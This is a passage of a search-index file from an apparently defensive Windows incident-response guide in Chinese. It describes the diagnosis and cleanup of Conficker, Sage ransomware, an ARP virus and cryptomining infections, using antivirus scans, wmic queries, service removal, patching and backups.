2\u3001\u75c5\u6bd2\u67e5\u6740\uff1a\u5361\u5df4\u65af\u57fa\u5168\u76d8\u626b\u63cf\uff0c\u53d1\u73b0\u5f02\u5e38\u6587\u4ef6 3\u3001\u786e\u8ba4\u75c5\u6bd2\uff1a\u4f7f\u7528\u591a\u5f15\u64ce\u5728\u7ebf\u75c5\u6bd2\u5bf9\u8be5\u6587\u4ef6\u626b\u63cf\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u611f\u67d3conficker\u8815\u866b\u75c5\u6bd2\u3002 4\u3001\u75c5\u6bd2\u5904\u7406\uff1a\u4f7f\u7528conficker\u8815\u866b\u4e13\u6740\u5de5\u5177\u5bf9\u670d\u52a1\u5668\u8fdb\u884c\u6e05\u67e5\uff0c\u6210\u529f\u6e05\u9664\u75c5\u6bd2\u3002","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x04_1","text":"\u5728\u653f\u5e9c\u3001\u533b\u9662\u5185\u7f51\uff0c\u4f9d\u7136\u5b58\u5728\u7740\u4e00\u4e9b\u5f88\u53e4\u8001\u7684\u611f\u67d3\u6027\u75c5\u6bd2\uff0c\u5982\u4f55\u4fdd\u62a4\u7535\u8111\u4e0d\u53d7\u75c5\u6bd2\u611f\u67d3\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf 2\u3001\u4e0d\u4f7f\u7528\u6765\u5386\u4e0d\u660e\u7684\u8f6f\u4ef6\uff0c\u4e0d\u968f\u610f\u63a5\u5165\u672a\u7ecf\u67e5\u6740\u7684U\u76d8 3\u3001\u5b9a\u671f\u5bf9windows\u7cfb\u7edf\u6f0f\u6d1e\u8fdb\u884c\u4fee\u590d\uff0c\u4e0d\u7ed9\u75c5\u6bd2\u53ef\u4e58\u4e4b\u673a 4\u3001\u505a\u597d\u91cd\u8981\u6587\u4ef6\u7684\u5907\u4efd\uff0c\u5907\u4efd\uff0c\u5907\u4efd\u3002","title":"0x04 \u9884\u9632\u5904\u7406\u63aa\u65bd"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#3","text":"","title":"\u7b2c3\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x00_2","text":"\u52d2\u7d22\u75c5\u6bd2\uff0c\u662f\u4e00\u79cd\u65b0\u578b\u7535\u8111\u75c5\u6bd2\uff0c\u4e3b\u8981\u4ee5\u90ae\u4ef6\u3001\u7a0b\u5e8f\u6728\u9a6c\u3001\u7f51\u9875\u6302\u9a6c\u7684\u5f62\u5f0f\u8fdb\u884c\u4f20\u64ad\u3002\u8be5\u75c5\u6bd2\u6027\u8d28\u6076\u52a3\u3001\u5371\u5bb3\u6781\u5927\uff0c\u4e00\u65e6\u611f\u67d3\u5c06\u7ed9\u7528\u6237\u5e26\u6765\u65e0\u6cd5\u4f30\u91cf\u7684\u635f\u5931\u3002\u8fd9\u79cd\u75c5\u6bd2\u5229\u7528\u5404\u79cd\u52a0\u5bc6\u7b97\u6cd5\u5bf9\u6587\u4ef6\u8fdb\u884c\u52a0\u5bc6\uff0c\u88ab\u611f\u67d3\u8005\u4e00\u822c\u65e0\u6cd5\u89e3\u5bc6\uff0c\u5fc5\u987b\u62ff\u5230\u89e3\u5bc6\u7684\u79c1\u94a5\u624d\u6709\u53ef\u80fd\u7834\u89e3\u3002\u81eaWannaCry\u52d2\u7d22\u75c5\u6bd2\u5728\u5168\u7403\u7206\u53d1\u4e4b\u540e\uff0c\u5404\u79cd\u53d8\u79cd\u53ca\u65b0\u578b\u52d2\u7d22\u75c5\u6bd2\u5c42\u51fa\u4e0d\u7a77\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x01_2","text":"\u67d0\u5929\u65e9\u4e0a\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u6253\u5f00OA\u7cfb\u7edf\uff0c\u9996\u9875\u8bbf\u95ee\u5f02\u5e38\uff0c\u663e\u793a\u4e71\u7801\uff1a","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x02_2","text":"\u767b\u5f55\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u6392\u67e5\uff0c\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u6240\u6709\u7684\u811a\u672c\u6587\u4ef6\u53ca\u9644\u4ef6\u90fd\u88ab\u52a0\u5bc6\u4e3a.sage\u7ed3\u5c3e\u7684\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5939\u4e0b\u90fd\u6709\u4e00\u4e2a!HELP_SOS.hta\u6587\u4ef6\uff0c\u6253\u5305\u4e86\u90e8\u5206\u6837\u672c\uff1a \u6253\u5f00!HELP_SOS.hta\u6587\u4ef6\uff0c\u663e\u793a\u5982\u4e0b\uff1a \u5230\u8fd9\u91cc\uff0c\u57fa\u672c\u53ef\u4ee5\u786e\u8ba4\u662f\u670d\u52a1\u5668\u4e2d\u4e86\u52d2\u7d22\u75c5\u6bd2\uff0c\u4e0a\u4f20\u6837\u672c\u5230360\u52d2\u7d22\u75c5\u6bd2\u7f51\u7ad9\uff08 http://lesuobingdu.360.cn \uff09\u8fdb\u884c\u5206\u6790\uff1a\u786e\u8ba4web\u670d\u52a1\u5668\u4e2d\u4e86sage\u52d2\u7d22\u75c5\u6bd2\uff0c\u76ee\u524d\u6682\u65f6\u65e0\u6cd5\u89e3\u5bc6\u3002 \u7edd\u5927\u591a\u6570\u52d2\u7d22\u75c5\u6bd2\uff0c\u662f\u65e0\u6cd5\u89e3\u5bc6\u7684\uff0c\u4e00\u65e6\u88ab\u52a0\u5bc6\uff0c\u5373\u4f7f\u652f\u4ed8\u4e5f\u4e0d\u4e00\u5b9a\u80fd\u591f\u83b7\u5f97\u89e3\u5bc6\u5bc6\u94a5\u3002\u5728\u5e73\u65f6\u8fd0\u7ef4\u4e2d\u5e94\u79ef\u6781\u505a\u597d\u5907\u4efd\u5de5\u4f5c\uff0c\u6570\u636e\u5e93\u4e0e\u6e90\u7801\u5206\u79bb\uff08\u7c7b\u4f3cOA\u7cfb\u7edf\u9644\u4ef6\u8d44\u6e90\u4e5f\u5f88\u91cd\u8981\uff0c\u4e5f\u8981\u5907\u4efd\uff09\u3002 \u9047\u5230\u4e86\uff0c\u522b\u6025\uff0c\u8bd5\u4e00\u8bd5\u52d2\u7d22\u75c5\u6bd2\u89e3\u5bc6\u5de5\u5177\uff1a \u201c\u62d2\u7edd\u52d2\u7d22\u8f6f\u4ef6\u201d\u7f51\u7ad9 https://www.nomoreransom.org/zh/index.html 360\u5b89\u5168\u536b\u58eb\u52d2\u7d22\u75c5\u6bd2\u4e13\u9898 http://lesuobingdu.360.cn","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x04_2","text":"\u4e00\u65e6\u4e2d\u4e86\u52d2\u7d22\u75c5\u6bd2\uff0c\u6587\u4ef6\u4f1a\u88ab\u9501\u6b7b\uff0c\u6ca1\u6709\u529e\u6cd5\u6b63\u5e38\u8bbf\u95ee\u4e86\uff0c\u8fd9\u65f6\u5019\uff0c\u4f1a\u7ed9\u4f60\u5e26\u6765\u6781\u5927\u7684\u56f0\u607c\u3002\u4e3a\u4e86\u9632\u8303\u8fd9\u6837\u7684\u4e8b\u60c5\u51fa\u73b0\uff0c\u6211\u4eec\u7535\u8111\u4e0a\u8981\u5148\u505a\u597d\u4e00\u4e9b\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\uff0c\u4fdd\u6301\u76d1\u63a7\u5f00\u542f\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3\uff0c\u5982445\u3001135\u3001137\u3001138\u3001139\u30013389\u7b49\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6 4\u3001\u5907\u4efd\u3002\u91cd\u8981\u7684\u8d44\u6599\u4e00\u5b9a\u8981\u5907\u4efd\uff0c\u8c28\u9632\u8d44\u6599\u4e22\u5931 5\u3001\u5f3a\u5316\u7f51\u7edc\u5b89\u5168\u610f\u8bc6\uff0c\u964c\u751f\u94fe\u63a5\u4e0d\u70b9\u51fb\uff0c\u964c\u751f\u6587\u4ef6\u4e0d\u8981\u4e0b\u8f7d\uff0c\u964c\u751f\u90ae\u4ef6\u4e0d\u8981\u6253\u5f00","title":"0x04 \u9632\u8303\u63aa\u65bd"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#4arp","text":"","title":"\u7b2c4\u7bc7\uff1aARP\u75c5\u6bd2"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x00_3","text":"ARP\u75c5\u6bd2\u5e76\u4e0d\u662f\u67d0\u4e00\u79cd\u75c5\u6bd2\u7684\u540d\u79f0\uff0c\u800c\u662f\u5bf9\u5229\u7528arp\u534f\u8bae\u7684\u6f0f\u6d1e\u8fdb\u884c\u4f20\u64ad\u7684\u4e00\u7c7b\u75c5\u6bd2\u7684\u603b\u79f0\uff0c\u76ee\u524d\u5728\u5c40\u57df\u7f51\u4e2d\u8f83\u4e3a\u5e38\u89c1\u3002\u53d1\u4f5c\u7684\u65f6\u5019\u4f1a\u5411\u5168\u7f51\u53d1\u9001\u4f2a\u9020\u7684ARP\u6570\u636e\u5305\uff0c\u4e25\u91cd\u5e72\u6270\u5168\u7f51\u7684\u6b63\u5e38\u8fd0\u884c\uff0c\u5176\u5371\u5bb3\u751a\u81f3\u6bd4\u4e00\u4e9b\u8815\u866b\u75c5\u6bd2\u8fd8\u8981\u4e25\u91cd\u5f97\u591a\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x01_3","text":"\u67d0\u5929\u65e9\u4e0a\uff0c\u5c0f\u4f19\u4f34\u7ed9\u6211\u53d1\u4e86\u4e00\u4e2a\u5fae\u4fe1\uff0c\u8bf4192.168.64.76 CPU\u73b0\u5728\u8d1f\u8f7d\u5f88\u9ad8\uff0c\u5728\u65e5\u5fd7\u5206\u6790\u5e73\u53f0\u67e5\u770b\u4e86\u4e00\u4e0b\u8fd9\u53f0\u670d\u52a1\u5668\u7684\u76f8\u5173\u65e5\u5fd7\uff0c\u6d41\u91cf\u5728\u67d0\u4e2a\u65f6\u95f4\u70b9\u66b4\u6da8\uff0c\u53d1\u73b0\u5927\u91cf137\u7aef\u53e3\u7684UDP\u653b\u51fb\u3002","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x02_3","text":"\u767b\u5f55\u670d\u52a1\u5668\uff0c\u9996\u5148\u67e5\u770b137\u7aef\u53e3\u5bf9\u5e94\u7684\u8fdb\u7a0b\uff0c\u8fdb\u7a0bID\u4e3a4\u5bf9\u5e94\u7684\u8fdb\u7a0b\u662fSYSTEM\uff0c\u4e8e\u662f\u4f7f\u7528\u6740\u6bd2\u8f6f\u4ef6\u8fdb\u884c\u5168\u76d8\u67e5\u6740\u3002 \u5361\u5df4\u65af\u57fa\u7eff\u8272\u7248\uff1a http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe \u5361\u5df4\u65af\u57fa\u3001360\u6740\u6bd2\u3001McAfee\u67e5\u6740\u65e0\u679c\uff0c\u624b\u5de5\u5c06\u542f\u52a8\u9879\u3001\u8ba1\u5212\u4efb\u52a1\u3001\u670d\u52a1\u9879\u90fd\u7ffb\u4e86\u4e00\u904d\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u3002 \u672c\u5730\u4e0b\u8f7d\u4e86IpTool\u6293\u5305\u5de5\u5177\uff0c\u7b5b\u9009\u6761\u4ef6\uff1a \u534f\u8bae UDP \u7aef\u53e3 137 \u53ef\u4ee5\u660e\u663e\u7684\u770b\u51fa192.168.64.76\u53d1\u9001\u7684\u6570\u636e\u5305\u662f\u5f02\u5e38\u7684\uff0c192.168.64.76\u7684\u6570\u636e\u5305\u76ee\u7684\u5730\u5740\uff0c\u4e00\u76f4\u5728\u53d8\uff0c\u76ee\u7684MAC\u662f\u4e0d\u53d8\u7684\uff0c\u800c\u8fd9\u4e2aMAC\u5730\u5740\u5c31\u662f\u7f51\u5173\u7684MAC\u3002 \u7aef\u53e3137\u7684udp\u5305\u662fnetbios\u7684\u5e7f\u64ad\u5305\uff0c\u731c\u6d4b\uff1a\u53ef\u80fd\u662fARP\u75c5\u6bd2\uff0c\u7531\u672c\u673a\u5bf9\u5916\u7684ARP\u653b\u51fb\u3002 \u91c7\u7528\u63aa\u65bd\uff1a\u901a\u8fc7\u501f\u52a9\u4e00\u4e9b\u5b89\u5168\u8f6f\u4ef6\u6765\u5b9e\u73b0\u5c40\u57df\u7f51ARP\u68c0\u6d4b\u53ca\u9632\u5fa1\u529f\u80fd\u3002 \u670d\u52a1\u5668\u5b89\u5168\u72d7Windows\u7248\u4e0b\u8f7d\uff1a http://free.safedog.cn/server_safedog.html \u7f51\u7edc\u9632\u706b\u5899--\u653b\u51fb\u9632\u62a4--ARP\u9632\u706b\u5899\uff1a \u867d\u7136\u6709\u62e6\u622a\u4e86\u90e8\u5206ARP\u8bf7\u6c42\uff0c\u4f46\u6d41\u91cf\u51fa\u53e3\u8fd8\u662f\u6709\u4e00\u4e9b137 UDF\u7684\u6570\u636e\u5305\u3002 \u770b\u6765\u8fd8\u662f\u5f97\u4e0b\u72e0\u62db\uff0c\u5173\u95ed137\u7aef\u53e3\uff1a\u7981\u7528TCP/IP\u4e0a\u7684NetBIOS\u3002 1\uff09\u3001\u7981\u7528Server\u670d\u52a1 2\uff09\u3001\u7981\u7528 TCP/IP \u4e0a\u7684 NetBIOS \u8bbe\u7f6e\u5b8c\uff0c\u4e0d\u7528\u91cd\u542f\u5373\u53ef\u751f\u6548\uff0c137\u7aef\u53e3\u5173\u95ed\uff0c\u89c2\u5bdf\u4e86\u4e00\u4f1a\uff0c\u5bf9\u5916\u53d1\u8d77\u7684\u8bf7\u6c42\u5df2\u6d88\u5931\uff0cCPU\u548c\u7f51\u7edc\u5e26\u5bbd\u6062\u590d\u6b63\u5e38\u3002","title":"0x02 \u5206\u6790\u8fc7\u7a0b"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x04_3","text":"\u5c40\u57df\u7f51\u5b89\u5168\u9632\u62a4\u4f9d\u7136\u662f\u4e00\u9879\u5f88\u8270\u5de8\u7684\u4efb\u52a1\uff0c\u7f51\u7edc\u7684\u5b89\u5168\u7b56\u7565\uff0c\u4e2a\u4eba/\u670d\u52a1\u5668\u7684\u9632\u6bd2\u673a\u5236\uff0c\u53ef\u4ee5\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u6b62\u75c5\u6bd2\u5165\u4fb5\u3002 \u53e6\u5916\u4e0d\u7ba1\u662f\u4e2a\u4ebaPC\u8fd8\u662f\u670d\u52a1\u5668\uff0c\u603b\u8fd8\u662f\u9700\u8981\u505a\u4e00\u4e9b\u57fa\u672c\u7684\u5b89\u5168\u9632\u62a4\uff1a1\u3001\u5173\u95ed135/137/138/139/445\u7b49\u7aef\u53e3 2\u3001\u66f4\u65b0\u7cfb\u7edf\u8865\u4e01\u3002","title":"0x04 \u9632\u62a4\u63aa\u65bd"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#5","text":"","title":"\u7b2c5\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e00\uff09"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x00_4","text":"\u968f\u7740\u865a\u62df\u8d27\u5e01\u7684\u75af\u72c2\u7092\u4f5c\uff0c\u6316\u77ff\u75c5\u6bd2\u5df2\u7ecf\u6210\u4e3a\u4e0d\u6cd5\u5206\u5b50\u5229\u7528\u6700\u4e3a\u9891\u7e41\u7684\u653b\u51fb\u65b9\u5f0f\u4e4b\u4e00\u3002\u75c5\u6bd2\u4f20\u64ad\u8005\u53ef\u4ee5\u5229\u7528\u4e2a\u4eba\u7535\u8111\u6216\u670d\u52a1\u5668\u8fdb\u884c\u6316\u77ff\uff0c\u5177\u4f53\u73b0\u8c61\u4e3a\u7535\u8111CPU\u5360\u7528\u7387\u9ad8\uff0cC\u76d8\u53ef\u4f7f\u7528\u7a7a\u95f4\u9aa4\u964d\uff0c\u7535\u8111\u6e29\u5ea6\u5347\u9ad8\uff0c\u98ce\u6247\u566a\u58f0\u589e\u5927\u7b49\u95ee\u9898\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x01_4","text":"\u67d0\u5929\u4e0a\u5348\u91cd\u542f\u670d\u52a1\u5668\u7684\u65f6\u5019\uff0c\u53d1\u73b0\u7a0b\u5e8f\u542f\u52a8\u5f88\u6162\uff0c\u6253\u5f00\u4efb\u52a1\u7ba1\u7406\u5668\uff0c\u53d1\u73b0cpu\u88ab\u5360\u7528\u63a5\u8fd1100%\uff0c\u670d\u52a1\u5668\u8d44\u6e90\u5360\u7528\u4e25\u91cd\u3002","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x02_4","text":"\u767b\u5f55\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u6392\u67e5\uff0c\u53d1\u73b0\u591a\u4e2a\u5f02\u5e38\u8fdb\u7a0b\uff1a \u5206\u6790\u8fdb\u7a0b\u53c2\u6570\uff1a wmic process get caption,commandline /value >> tmp.txt TIPS: \u5728windows\u4e0b\u67e5\u770b\u67d0\u4e2a\u8fd0\u884c\u7a0b\u5e8f\uff08\u6216\u8fdb\u7a0b\uff09\u7684\u547d\u4ee4\u884c\u53c2\u6570 \u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\uff1a wmic process get caption,commandline /value \u5982\u679c\u60f3\u67e5\u8be2\u67d0\u4e00\u4e2a\u8fdb\u7a0b\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4f7f\u7528\u4e0b\u5217\u65b9\u5f0f\uff1a wmic process where caption=\u201dsvchost.exe\u201d get caption,commandline /value \u8fd9\u6837\u5c31\u53ef\u4ee5\u5f97\u5230\u8fdb\u7a0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4f4d\u7f6e\u7b49\u4fe1\u606f\u3002 \u8bbf\u95ee\u8be5\u94fe\u63a5\uff1a Temp\u76ee\u5f55\u4e0b\u53d1\u73b0Carbon\u3001run.bat\u6316\u77ff\u7a0b\u5e8f: \u5177\u4f53\u6280\u672f\u5206\u6790\u7ec6\u8282\u8be6\u89c1\uff1a 360CERT\uff1a\u5229\u7528WebLogic\u6f0f\u6d1e\u6316\u77ff\u4e8b\u4ef6\u5206\u6790 https://www.anquanke.com/post/id/92223 \u6e05\u9664\u6316\u77ff\u75c5\u6bd2\uff1a\u5173\u95ed\u5f02\u5e38\u8fdb\u7a0b\u3001\u5220\u9664c\u76d8temp\u76ee\u5f55\u4e0b\u6316\u77ff\u7a0b\u5e8f \u3002 \u4e34\u65f6\u9632\u62a4\u65b9\u6848 \u6839\u636e\u5b9e\u9645\u73af\u5883\u8def\u5f84\uff0c\u5220\u9664WebLogic\u7a0b\u5e8f\u4e0b\u5217war\u5305\u53ca\u76ee\u5f55 rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat \u91cd\u542fWebLogic\u6216\u7cfb\u7edf\u540e\uff0c\u786e\u8ba4\u4ee5\u4e0b\u94fe\u63a5\u8bbf\u95ee\u662f\u5426\u4e3a404 http://x.x.x.x:7001/wls-wsat","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x04_4","text":"\u65b0\u7684\u6316\u77ff\u653b\u51fb\u5c55\u73b0\u51fa\u4e86\u7c7b\u4f3c\u8815\u866b\u7684\u884c\u4e3a\uff0c\u5e76\u7ed3\u5408\u4e86\u9ad8\u7ea7\u653b\u51fb\u6280\u672f\uff0c\u4ee5\u589e\u52a0\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u611f\u67d3\u7684\u6210\u529f\u7387\u3002\u901a\u8fc7\u5229\u7528\u6c38\u6052\u4e4b\u84dd\uff08EternalBlue\uff09\u3001web\u653b\u51fb\u591a\u79cd\u6f0f\u6d1e\uff0c\u5982Tomcat\u5f31\u53e3\u4ee4\u653b\u51fb\u3001Weblogic WLS\u7ec4\u4ef6\u6f0f\u6d1e\u3001Jboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0cStruts2\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u7b49\uff0c\u5bfc\u81f4\u5927\u91cf\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61 \u3002\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u5b89\u5168\u8f6f\u4ef6\u5e76\u5347\u7ea7\u75c5\u6bd2\u5e93\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf\uff0c\u4fdd\u6301\u5b9e\u65f6\u9632\u62a4 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6","title":"0x04 \u9632\u8303\u63aa\u65bd"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#6","text":"","title":"\u7b2c6\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e8c\uff09"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x00_5","text":"\u4f5c\u4e3a\u4e00\u4e2a\u8fd0\u7ef4\u5de5\u7a0b\u5e08\uff0c\u800c\u975e\u4e00\u4e2a\u4e13\u4e1a\u7684\u75c5\u6bd2\u5206\u6790\u5de5\u7a0b\u5e08\uff0c\u9047\u5230\u4e86\u6bd4\u8f83\u590d\u6742\u7684\u75c5\u6bd2\u600e\u4e48\u529e\uff1f\u522b\u6015\uff0c\u867d\u7136\u5bf9\u4e8c\u8fdb\u5236\u4e0d\u719f\uff0c\u4f46\u662f\u4f9d\u9760\u7cfb\u7edf\u8fd0\u7ef4\u7684\u7ecf\u9a8c\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u81ea\u5df1\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\u5b83\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x01_5","text":"1\u3001\u5411\u5927\u91cf\u8fdc\u7a0bIP\u7684445\u7aef\u53e3\u53d1\u9001\u8bf7\u6c42 2\u3001\u4f7f\u7528\u5404\u79cd\u6740\u6bd2\u8f6f\u4ef6\u67e5\u6740\u65e0\u679c\uff0c\u867d\u7136\u80fd\u8bc6\u522b\u51fa\u5728C:\\Windows\\NerworkDistribution\u4e2d\u53d1\u73b0\u5f02\u5e38\u6587\u4ef6\uff0c\u4f46\u5373\u4f7f\u5220\u9664NerworkDistribution\u540e\uff0c\u6bcf\u6b21\u91cd\u542f\u53c8\u4f1a\u518d\u6b21\u751f\u6210\u3002 \u8fde\u6740\u8f6f\u6e05\u9664\u4e0d\u4e86\u7684\u75c5\u6bd2\uff0c\u53ea\u80fd\u624b\u5de5\u6765\u5427\uff0c\u4e2a\u4eba\u6bd4\u8f83\u504f\u597d\u706b\u7ed2\uff0c\u754c\u9762\u6bd4\u8f83\u7b80\u6d01\uff0c\u529f\u80fd\u4e5f\u633a\u597d\u7528\u7684\uff0c\u81ea\u5e26\u7684\u706b\u7ed2\u5251\u662f\u5b89\u5168\u5206\u6790\u5229\u5668\u3002\u4e8e\u662f\u5b89\u88c5\u4e86\u706b\u7ed2\uff0c\u6709\u4e86\u5982\u4e0b\u5206\u6790\u6392\u67e5\u8fc7\u7a0b\u3002","title":"0x01 \u611f\u67d3\u73b0\u8c61"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x02_5","text":"","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#a","text":"\u901a\u8fc7\u73b0\u8c61\uff0c\u627e\u5230\u5bf9\u5916\u53d1\u9001\u8bf7\u6c42\u7684\u8fdb\u7a0bID\uff1a4960","title":"A\u3001\u7f51\u7edc\u94fe\u63a5"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#b","text":"\u8fdb\u4e00\u6b65\u901a\u8fc7\u8fdb\u7a0bID\u627e\u5230\u76f8\u5173\u8054\u7684\u8fdb\u7a0b\uff0c\u7236\u8fdb\u7a0b\u4e3a1464 \u627e\u5230\u8fdb\u7a0bID\u4e3a1464\u7684\u670d\u52a1\u9879\uff0c\u9010\u4e00\u6392\u67e5\uff0c\u6211\u4eec\u53d1\u73b0\u670d\u52a1\u9879RemoteUPnPService\u5b58\u5728\u5f02\u5e38\u3002","title":"B\u3001\u8fdb\u7a0b\u5206\u6790"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#c","text":"\u9009\u62e9\u53ef\u7591\u670d\u52a1\u9879\uff0c\u53f3\u952e\u5c5e\u6027\uff0c\u505c\u6b62\u670d\u52a1\uff0c\u542f\u52a8\u7c7b\u578b\uff1a\u7981\u6b62\u3002 \u505c\u6b62\u5e76\u7981\u7528\u670d\u52a1\uff0c\u518d\u6e05\u9664NerworkDistribution\u76ee\u5f55\u540e\uff0c\u91cd\u542f\u8ba1\u7b97\u673a\u3002\u5f02\u5e38\u8bf7\u6c42\u548c\u76ee\u5f55\u7684\u73b0\u8c61\u6d88\u5931\u3002 \u53c8\u6392\u67e5\u4e86\u51e0\u53f0\uff0c\u73b0\u8c61\u4e00\u81f4\uff0c\u5c31\u662f\u670d\u52a1\u9879\u7684\u540d\u79f0\u6709\u70b9\u53d8\u5316\u3002","title":"C\u3001\u5220\u9664\u670d\u52a1"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#d","text":"\u6316\u77ff\u75c5\u6bd2\u6e05\u9664\u8fc7\u7a0b\u5982\u4e0b\uff1a 1\u3001 \u505c\u6b62\u5e76\u7981\u7528\u53ef\u7591\u7684\u670d\u52a1\u9879\uff0c\u670d\u52a1\u9879\u7684\u540d\u79f0\u4f1a\u53d8\uff0c\u4f46\u63cf\u8ff0\u662f\u4e0d\u53d8\u7684\uff0c\u6839\u636e\u63cf\u8ff0\u53ef\u5feb\u901f\u627e\u5230\u53ef\u7591\u670d\u52a1\u9879\u3002 \u53ef\u7591\u670d\u52a1\u9879\u63cf\u8ff0\uff1aEnables a common interface and object model for the Remote UPnP Service to access \u5220\u9664\u670d\u52a1\u9879\uff1aSc delete RemoteUPnPService 2\u3001 \u5220\u9664C:\\Windows\\NerworkDistribution\u76ee\u5f55 3\u3001 \u91cd\u542f\u8ba1\u7b97\u673a 4\u3001 \u4f7f\u7528\u6740\u6bd2\u8f6f\u4ef6\u5168\u76d8\u67e5\u6740 5\u3001 \u5230\u5fae\u8f6f\u5b98\u65b9\u7f51\u7ad9\u4e0b\u8f7d\u5bf9\u5e94\u64cd\u4f5c\u7cfb\u7edf\u8865\u4e01\uff0c\u4e0b\u8f7d\u94fe\u63a5\uff1a https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010","title":"D\u3001\u75c5\u6bd2\u6e05\u9664"},{"location":"blueteam/windows%E5%AE%9E%E6%88%98/#0x03","text":"\u5728\u67e5\u8be2\u4e86\u5927\u91cf\u8d44\u6599\u540e\uff0c\u627e\u5230\u4e86\u4e00\u7bc7\u57282018\u5e742\u6708\u6709\u5173\u8be5\u75c5\u6bd2\u7684\u62a5\u544a\uff1a NrsMiner\uff1a\u4e00\u4e2a\u6784\u9020\u7cbe\u5bc6\u7684\u6316\u77ff\u50f5\u5c38\u7f51\u7edc https://www.freebuf.com/articles/system/162874.html \u6839\u636e\u6587\u7ae0\u63d0\u793a\uff0c\u8fd9\u4e2a\u75c5\u6bd2\u7684\u6784\u9020\u975e\u5e38\u7684\u590d\u6742\uff0c\u4e3b\u63a7\u6a21\u5757\u4f5c\u4e3a\u670d\u52a1\u201cHyper-VAccess Protection Agent Service\u201d\u7684ServiceDll\u5b58\u5728\u3002\u4f46\u4e0e\u76ee\u524d\u5904\u7406\u7684\u60c5\u51b5\u6709\u6240\u4e0d\u540c\uff0c\u8be5\u75c5\u6bd2\u7591\u4f3c\u662f\u5347\u7ea7\u4e86\u3002","title":"0x03 